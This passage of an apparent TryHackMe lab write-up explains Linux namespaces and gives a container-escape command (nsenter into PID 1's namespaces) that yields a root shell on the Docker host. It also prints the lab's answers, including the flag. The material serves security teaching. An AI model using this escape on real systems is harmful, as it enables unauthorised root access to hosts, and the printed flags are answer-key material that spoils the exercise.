style="color:#36acaa">7</span><span class="token plain"> minutes   </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:22-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">22</span><span class="token plain">/tcp, :::22-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token number" style="color:#36acaa">22</span><span class="token plain">/tcp   priceless_mirzakhani</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-now">What Now<a href="#what-now" class="hash-link" aria-label="Direct link to What Now" title="Direct link to What Now" translate="no">​</a></h3>
<p>Now that we&#x27;ve confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further. It is worth recalling the commands covered in <a href="https://tryhackme.com/room/introtodockerk8pdqk" target="_blank" rel="noopener noreferrer" class="">Intro to Docker</a>. However, I&#x27;ve included some commands that you may wish to explore:</p>
<table><thead><tr><th style="text-align:left">Command</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">images</td><td style="text-align:left">List images used by containers; data can also be exfiltrated by reverse-engineering the image.</td></tr><tr><td style="text-align:left">exec</td><td style="text-align:left">Execute a command on a container.</td></tr><tr><td style="text-align:left">run</td><td style="text-align:left">Run a container.</td></tr></tbody></table>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What port number, by default, does the Docker Engine use? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">2375</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-6-vulnerability-4-abusing-namespaces">Task 6 Vulnerability 4: Abusing Namespaces<a href="#task-6-vulnerability-4-abusing-namespaces" class="hash-link" aria-label="Direct link to Task 6 Vulnerability 4: Abusing Namespaces" title="Direct link to Task 6 Vulnerability 4: Abusing Namespaces" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-are-namespaces">What Are Namespaces<a href="#what-are-namespaces" class="hash-link" aria-label="Direct link to What Are Namespaces" title="Direct link to What Are Namespaces" translate="no">​</a></h3>
<p>Namespaces segregate system resources such as processes, files, and memory away from other namespaces. Every process running on Linux will be assigned two things:</p>
<ul>
<li class="">A namespace</li>
<li class="">A Process Identifier (PID)</li>
</ul>
<p>Namespaces are how containerisation is achieved! Processes can only &quot;see&quot; the process in the same namespace. Take Docker, for example, every new container will run as a new namespace, although the container may run multiple applications (processes).
Let&#x27;s prove the concept of containerisation by comparing the number of processes on the host operating system, in comparison to the Docker container that the host is running (an apache2 web server):</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing running processes on a </div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic@thm-dev:~$ </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token plain">         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token parameter variable" style="color:#36acaa">--cut</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity--</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">1984</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.7</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">493400</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">28932</span><span class="token plain"> ?        Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 update-notifier</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">2263</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">5.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3385096</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">396960</span><span class="token plain"> ?      Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:08 /snap/firefox/1232/usr/lib/firefox/firefox</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">2429</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">2.8</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2447088</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">114900</span><span class="token plain"> ?      Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> -</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">2457</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1385228</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">18496</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/snap userd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3054</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">2.3</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2425836</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">91936</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">520</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3346</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.7</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">4.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2526924</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">162944</span><span class="token plain"> ?      Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:02 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">584</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3350</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2390708</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66560</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">584</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3369</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2390712</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66672</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">584</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3417</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2390708</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">66432</span><span class="token plain"> ?       Sl   00:48   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /snap/firefox/1232/usr/lib/firefox/firefox </span><span class="token parameter variable" style="color:#36acaa">-contentproc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-childID</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-isForBrowser</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-prefsLen</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">590</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3490</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.3</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">428192</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12288</span><span class="token plain"> ?        Sl   00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/libexec/deja-dup/deja-dup-monitor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3524</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.8</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">932320</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">74496</span><span class="token plain"> ?        Sl   00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/nautilus --gapplication-service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3545</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.7</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">1.3</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">557340</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">55232</span><span class="token plain"> ?        Ssl  00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/libexec/gnome-terminal-server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmnatic     </span><span class="token number" style="color:#36acaa">3563</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">12908</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">6784</span><span class="token plain"> pts/0    Ss+  00:49   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 </span><span class="token function" style="color:#d73a49">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token parameter variable" style="color:#36acaa">--cut</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity--</span><br></span></code></pre></div></div>
<p>In the first column on the very left, we can see the user the process is running as including the process number (PID). Additionally, notice that the column on the very right has the command or application that started the process (such as Firefox and Gnome terminal). It&#x27;s important to note here that multiple applications and processes are running (specifically 320!).</p>
<p>Generally speaking, a Docker container will have very processes running. This is because a container is designed to do one task. I.e., just run a web server, or a database.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="determining-if-were-in-a-container-processes">Determining if We&#x27;re in a Container (Processes)<a href="#determining-if-were-in-a-container-processes" class="hash-link" aria-label="Direct link to Determining if We&#x27;re in a Container (Processes)" title="Direct link to Determining if We&#x27;re in a Container (Processes)" translate="no">​</a></h3>
<p>Let&#x27;s list the processes running in our Docker container using <code>ps aux</code>. It&#x27;s important to note that we only have six processes running in this example. The difference in the number of processes is usually a great indicator that we&#x27;re in a container.</p>
<p>Additionally, the first process in the snippet below has a PID of 1. This is the first process that is running. PID 1 (usually init) is the ancestor (parent) for all future processes that are started. If, for whatever reason, this process is stopped, then all other processes are stopped too.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Listing running processes on a container</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@demo-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># ps aux</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token plain">         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.2</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.2</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">166612</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11356</span><span class="token plain"> ?        Ss   00:47   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /sbin/init </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root          </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6520</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5212</span><span class="token plain"> ?  S 00:47 </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/apache2 </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> FOREGROUND </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data      </span><span class="token number" style="color:#36acaa">15</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1211168</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4112</span><span class="token plain"> ?  S 00:47 </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/apache2 </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> FOREGROUND </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data      </span><span class="token number" style="color:#36acaa">16</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1211168</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4116</span><span class="token plain"> ?  S 00:47 </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/apache2 </span><span class="token parameter variable" style="color:#36acaa">-D</span><span class="token plain"> FOREGROUND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root          </span><span class="token number" style="color:#36acaa">81</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5888</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2972</span><span class="token plain"> pts/0  R+ 00:52 </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux</span><br></span></code></pre></div></div>
<p>Comparatively, we can see that only 5 processes are running. A good indicator that we&#x27;re in a container! However, as we come to discover shortly, this is not 100% indicative. There are cases where, ironically, you want the container to be able to interact directly with the host.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-can-we-abuse-namespaces">How Can We Abuse Namespaces<a href="#how-can-we-abuse-namespaces" class="hash-link" aria-label="Direct link to How Can We Abuse Namespaces" title="Direct link to How Can We Abuse Namespaces" translate="no">​</a></h3>
<p>Recall cgroups (control groups) in a previous vulnerability. We are going to be using these in another method of exploitation. This attack abuses conditions where the container will share the same namespace as the host operating system (and therefore, the container can communicate with the processes on the host).</p>
<p>You might see this in cases where the container relies on a process running or needs to &quot;plug in&quot; to the host such as the use of debugging tools. In these situations, you can expect to see the host&#x27;s processes in the container when listing them via <code>ps aux</code>.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Edge case: Determining if a container can interact with the host&#x27;s processes</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@demo-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># ps aux</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token environment constant" style="color:#36acaa">USER</span><span class="token plain">         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.5</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">102796</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11372</span><span class="token plain"> ?        Ss   </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">:40   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:03 /sbin/init</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">      </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">     </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> ?        S    </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">:40   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">kthreadd</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root           </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">      </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">     </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> ?        I</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">11</span><span class="token plain">:40   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rcu_gp</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-- </span><span class="token function" style="color:#d73a49">cut</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> brevity --</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2119</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1148348</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3372</span><span class="token plain"> ?        Sl   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/docker-proxy </span><span class="token parameter variable" style="color:#36acaa">-proto</span><span class="token plain"> tcp -host-ip </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0 -host-port </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> -container-ip </span><span class="token number" style="color:#36acaa">172.17</span><span class="token plain">.0.2 </span><span class="token parameter variable" style="color:#36acaa">-container</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2125</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.1</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1148348</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3392</span><span class="token plain"> ?        Sl   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/docker-proxy </span><span class="token parameter variable" style="color:#36acaa">-proto</span><span class="token plain"> tcp -host-ip :: -host-port </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> -container-ip </span><span class="token number" style="color:#36acaa">172.17</span><span class="token plain">.0.2 -container-port</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2141</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.4</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">712144</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">9192</span><span class="token plain"> ?        Sl   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/bin/containerd-shim-runc-v2 </span><span class="token parameter variable" style="color:#36acaa">-namespace</span><span class="token plain"> moby </span><span class="token parameter variable" style="color:#36acaa">-id</span><span class="token plain"> 2032326e64254786be0a420199ef845d8f97afccba9e2e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root        </span><span class="token number" style="color:#36acaa">2163</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.2</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">72308</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">5644</span><span class="token plain"> ?        Ss   </span><span class="token number" style="color:#36acaa">12</span><span class="token plain">:00   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 /usr/sbin/sshd </span><span class="token parameter variable" style="color:#36acaa">-D</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-exploit">The Exploit<a href="#the-exploit" class="hash-link" aria-label="Direct link to The Exploit" title="Direct link to The Exploit" translate="no">​</a></h3>
<p>For this vulnerability, we will be using nsenter (namespace enter). This command allows us to execute or start processes, and place them within the same namespace as another process. In this case, we will be abusing the fact that the container can see the &quot;/sbin/init&quot; process on the host, meaning that we can launch new commands such as a bash shell on the host.</p>
<hr>
<p>Use the following exploit: <code>nsenter --target 1 --mount --uts --ipc --net /bin/bash</code>, which does the following:</p>
<ol>
<li class="">
<p>We use the <code>--target</code> switch with the value of &quot;1&quot; to execute our shell command that we later provide to execute in the namespace of the special system process ID to get the ultimate root!</p>
</li>
<li class="">
<p>Specifying <code>--mount</code> this is where we provide the mount namespace of the process that we are targeting. &quot;If no file is specified, enter the mount namespace of the target process.&quot; (<a href="https://man7.org/linux/man-pages/man1/nsenter.1.html" target="_blank" rel="noopener noreferrer" class="">Man.org., 2013</a>).</p>
</li>
<li class="">
<p>The <code>--uts</code> switch allows us to share the same UTS namespace as the target process meaning the same hostname is used. This is important as mismatching hostnames can cause connection issues (especially with network services).</p>
</li>
<li class="">
<p>The <code>--ipc</code> switch means that we enter the Inter-process Communication namespace of the process which is important. This means that memory can be shared.</p>
</li>
<li class="">
<p>The <code>--net</code> switch means that we enter the network namespace meaning that we can interact with network-related features of the system. For example, the network interfaces. We can use this to open up a new connection (such as a stable reverse shell on the host).</p>
</li>
<li class="">
<p>As we are targeting the &quot;<strong>/sbin/init</strong>&quot; process #1 (although it&#x27;s a symbolic link to &quot;<strong>lib/systemd/systemd</strong>&quot; for backwards compatibility), we are using the namespace and permissions of the <a href="https://www.freedesktop.org/wiki/Software/systemd/" target="_blank" rel="noopener noreferrer" class="">systemd</a> daemon for our new process (the shell)</p>
</li>
<li class="">
<p>Here&#x27;s where our process will be executed into this privileged namespace: <code>sh</code> or a shell. This will execute in the same namespace (and therefore privileges) of the kernel.</p>
</li>
</ol>
<p>You may need to &quot;<strong>Ctrl + C</strong>&quot; to cancel the exploit once or twice for this vulnerability to work, but as you can see below, we have escaped the docker container and can look around the host OS (showing the change in hostname)</p>
<hr>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Using the command line of the container to run commands on the host</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@demo-container:~</span><span class="token comment" style="color:#999988;font-style:italic"># hostname</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">thm-docker-host</span><br></span></code></pre></div></div>
<p>Success! We will now be able to look around the host operating system in the namespace as root, meaning we have full access to anything on the host!</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Perform the exploit in this task on the target machine. <strong>What is the flag located in /home/tryhackme/flag.txt?</strong> </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{YOUR-SPACE-MY-SPACE}</span><br></span></code></pre></div></div></div></div></details></div></div>
